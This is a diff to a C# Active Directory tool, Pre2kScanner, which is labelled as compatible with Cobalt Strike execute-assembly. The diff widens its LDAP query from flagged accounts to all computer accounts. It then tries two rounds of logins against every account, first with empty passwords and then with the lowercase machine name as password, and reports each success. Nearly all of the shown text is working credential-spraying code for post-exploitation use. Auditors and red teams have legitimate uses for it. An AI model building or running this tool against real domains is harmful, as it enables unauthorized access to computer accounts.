@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 
 /// <summary>
 /// Pre-Windows 2000 compatible computer account vulnerability scanner.
-/// Queries Active Directory for computer accounts with weak authentication.
+/// Queries Active Directory for ALL computer accounts and tests for weak authentication.
 /// Compatible with Cobalt Strike execute-assembly.
 /// </summary>
 namespace Pre2kScanner
@@ -62,7 +62,7 @@ namespace Pre2kScanner
         }
 
         /// <summary>
-        /// Queries Active Directory for computer accounts with pre-Windows 2000 compatible flag.
+        /// Queries Active Directory for ALL computer accounts.
         /// </summary>
         /// <returns>List of computer accounts</returns>
         public List<ComputerAccount> QueryComputers()
@@ -84,9 +84,9 @@ namespace Pre2kScanner
             using (directoryEntry)
             using (var searcher = new DirectorySearcher(directoryEntry))
             {
-                // LDAP filter for computers with pre-Windows 2000 compatible flag
-                // userAccountControl:1.2.840.113556.1.4.803:=4128
-                searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=4128))";
+                // LDAP filter for ALL computer accounts
+                // Pre-Windows 2000 compatible computers don't have a reliable flag - we must test all computers
+                searcher.Filter = "(&(objectCategory=computer)(objectClass=computer))";
                 searcher.PageSize = 1000;
                 searcher.PropertiesToLoad.Add("sAMAccountName");
                 searcher.PropertiesToLoad.Add("dNSHostName");
@@ -222,42 +222,58 @@ namespace Pre2kScanner
         {
             if (computers.Count == 0)
             {
-                Console.WriteLine("[*] No pre-Windows 2000 compatible computer accounts found");
+                Console.WriteLine("[*] No computer accounts found");
                 return 0;
             }
 
-            Console.WriteLine("[*] Testing authentication...");
-
             var vulnerableCount = 0;
-            var progressCounter = 0;
             var totalComputers = computers.Count;
 
-            foreach (var computer in computers)
+            // Phase 1: Test empty passwords
+            if (!_nameOnly)
             {
-                progressCounter++;
+                Console.WriteLine("[*] Phase 1: Testing empty passwords on {0} computer accounts...", totalComputers);
+                var progressCounter = 0;
 
-                // Update progress every 50 computers
-                if (progressCounter % 50 == 0 || progressCounter == totalComputers)
+                foreach (var computer in computers)
                 {
-                    Console.WriteLine("[*] Progress: {0}/{1}", progressCounter, totalComputers);
-                }
+                    progressCounter++;
 
-                var authUsername = string.Format("{0}\\{1}", _domainForAuth, computer.SAMAccountName);
+                    // Update progress every 50 computers or on last computer
+                    if (progressCounter % 50 == 0 || progressCounter == totalComputers)
+                    {
+                        Console.WriteLine("[*] Progress (Empty Password): {0}/{1}", progressCounter, totalComputers);
+                    }
 
-                // Test empty password
-                if (!_nameOnly)
-                {
+                    var authUsername = string.Format("{0}\\{1}", _domainForAuth, computer.SAMAccountName);
+
                     if (TestAuthentication(authUsername, string.Empty))
                     {
                         Console.WriteLine("[!] SUCCESS: {0} - Empty password", computer.SAMAccountName);
                         vulnerableCount++;
                     }
                 }
+            }
 
-                // Test machine name password
-                if (!_emptyOnly)
+            // Phase 2: Test machine name passwords
+            if (!_emptyOnly)
+            {
+                Console.WriteLine("[*] Phase 2: Testing machine name passwords on {0} computer accounts...", totalComputers);
+                var progressCounter = 0;
+
+                foreach (var computer in computers)
                 {
+                    progressCounter++;
+
+                    // Update progress every 50 computers or on last computer
+                    if (progressCounter % 50 == 0 || progressCounter == totalComputers)
+                    {
+                        Console.WriteLine("[*] Progress (Machine Name Password): {0}/{1}", progressCounter, totalComputers);
+                    }
+
+                    var authUsername = string.Format("{0}\\{1}", _domainForAuth, computer.SAMAccountName);
                     var machinePassword = GetMachinePassword(computer.SAMAccountName);
+
                     if (TestAuthentication(authUsername, machinePassword))
                     {
                         Console.WriteLine("[!] SUCCESS: {0} - Password matches machine name", computer.SAMAccountName);
@@ -283,10 +299,10 @@ namespace Pre2kScanner
             Console.WriteLine("Pre2k.exe - Pre-Windows 2000 Compatible Computer Account Scanner");
             Console.WriteLine();
             Console.WriteLine("DESCRIPTION:");
-            Console.WriteLine("  Queries Active Directory for computer accounts with the pre-Windows 2000");
-            Console.WriteLine("  compatible flag (userAccountControl:1.2.840.113556.1.4.803:=4128) and tests");
-            Console.WriteLine("  for weak authentication using empty passwords or passwords matching the");
-            Console.WriteLine("  lowercase machine name.");
+            Console.WriteLine("  Queries Active Directory for ALL computer accounts and tests for weak");
+            Console.WriteLine("  authentication commonly found in pre-Windows 2000 compatible accounts,");
+            Console.WriteLine("  using empty passwords or passwords matching the lowercase machine name");
+            Console.WriteLine("  (first 14 characters).");
             Console.WriteLine();
             Console.WriteLine("USAGE:");
             Console.WriteLine("  Pre2k.exe [options]");
